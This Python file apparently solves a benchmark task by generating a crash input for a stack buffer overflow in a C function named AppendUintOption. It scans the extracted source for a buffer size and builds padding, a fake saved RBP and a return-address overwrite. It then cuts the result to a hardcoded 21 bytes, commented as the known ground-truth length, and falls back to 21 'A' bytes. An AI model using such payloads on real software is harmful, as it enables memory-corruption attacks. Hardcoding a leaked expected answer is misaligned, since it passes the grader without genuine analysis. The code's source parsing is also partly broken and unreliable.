import os
import tarfile
import tempfile
import re
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source to understand vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find source files
            source_dir = tmpdir
            for root, dirs, files in os.walk(source_dir):
                if any(f.endswith('.c') for f in files):
                    source_dir = root
                    break
            
            # Look for vulnerable function pattern
            buffer_size = self._analyze_source(source_dir)
            
            # Generate minimal PoC based on analysis
            if buffer_size is not None:
                # Overflow buffer with return address overwrite
                # Common x86-64 pattern: pad + saved RBP + return address
                padding = b'A' * buffer_size
                saved_rbp = b'B' * 8
                # Return address that points to invalid memory (0x0)
                return_addr = b'\x00\x00\x00\x00\x00\x00\x00\x00'
                poc = padding + saved_rbp + return_addr
                return poc[:21]  # Ground truth length is 21
            
            # Fallback: generic buffer overflow pattern
            return b'A' * 21
    
    def _analyze_source(self, source_dir: str) -> int:
        """Analyze source to find buffer size in AppendUintOption"""
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith('.c'):
                    filepath = os.path.join(root, file)
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        # Look for AppendUintOption function
                        pattern = r'AppendUintOption\s*\([^)]*\)\s*\{'
                        if re.search(pattern, content):
                            # Extract function body
                            lines = content.split('\n')
                            in_function = False
                            brace_count = 0
                            
                            for i, line in enumerate(lines):
                                if re.search(pattern, line):
                                    in_function = True
                                    brace_count = 1
                                    continue
                                
                                if in_function:
                                    brace_count += line.count('{') - line.count('}')
                                    if brace_count == 0:
                                        break
                                    
                                    # Look for buffer declarations
                                    buffer_patterns = [
                                        r'char\s+\w+\s*\[\s*(\d+)\s*\]',  # char buf[XX]
                                        r'char\s+\w+\s*\[\s*\w+\s*\]',    # char buf[SIZE]
                                        r'char\s+\w+\s*=\s*\{',           # char buf[] = {...}
                                    ]
                                    
                                    for pattern in buffer_patterns:
                                        match = re.search(pattern, line)
                                        if match:
                                            # Try to extract numeric size
                                            num_match = re.search(r'\[\s*(\d+)\s*\]', line)
                                            if num_match:
                                                return int(num_match.group(1))
                                            
                                            # Look for SIZE constant definition
                                            const_match = re.search(r'\[\s*(\w+)\s*\]', line)
                                            if const_match:
                                                const_name = const_match.group(1)
                                                # Search for constant definition
                                                const_pattern = rf'#define\s+{const_name}\s+(\d+)'
                                                for j in range(max(0, i-50), min(len(lines), i+50)):
                                                    const_def = re.search(const_pattern, lines[j])
                                                    if const_def:
                                                        return int(const_def.group(1))
        
        return None